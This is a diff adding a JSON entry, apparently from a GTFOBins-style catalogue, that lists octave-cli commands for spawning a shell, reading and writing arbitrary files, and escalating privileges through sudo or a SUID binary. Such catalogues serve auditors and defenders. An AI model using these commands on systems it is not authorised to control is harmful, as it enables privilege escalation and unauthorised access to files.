@@ -1,0 +1,30 @@
+{
+  "description": "The payloads are compatible with GUI.",
+  "functions": {
+    "shell": [
+      {
+        "code": "octave-cli --eval 'system(\"/bin/sh\")'"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "octave-cli --eval 'filename = \"[file]\"; fid = fopen(filename, \"w\"); fputs(fid, \"[data]\"); fclose(fid);'"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "octave-cli --eval 'format none; fid = fopen(\"[file]\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./octave-cli --eval 'system(\"/bin/sh\")'"
+      }
+    ]
+  }
+}
